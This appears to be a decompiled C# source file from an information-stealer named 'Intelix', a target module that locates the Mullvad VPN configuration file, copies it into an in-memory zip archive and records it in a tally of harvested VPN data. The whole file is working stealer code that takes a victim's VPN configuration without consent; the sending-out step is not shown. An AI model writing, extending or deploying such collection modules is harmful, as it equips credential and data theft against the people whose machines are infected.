using System;
using System.IO;
using Intelix.Helper.Data;

namespace Intelix.Targets.Vpn
{
	// Token: 0x0200000D RID: 13
	public class MullVad : ITarget
	{
		// Token: 0x0600002C RID: 44 RVA: 0x00002D50 File Offset: 0x00000F50
		public void Collect(InMemoryZip zip, Counter counter)
		{
			string text = "C:\\Program Files\\Mullvad VPN\\Configs\\Mullvad";
			bool flag = File.Exists(text);
			if (flag)
			{
				string text2 = "Mullvad";
				Counter.CounterApplications counterApplications = new Counter.CounterApplications();
				counterApplications.Name = "Mullvad";
				zip.AddFile(Path.Combine(text2, Path.GetFileName(text)), File.ReadAllBytes(text));
				counterApplications.Files.Add(text + " => " + text2);
				counterApplications.Files.Add(text2);
				counter.Vpns.Add(counterApplications);
			}
		}
	}
}
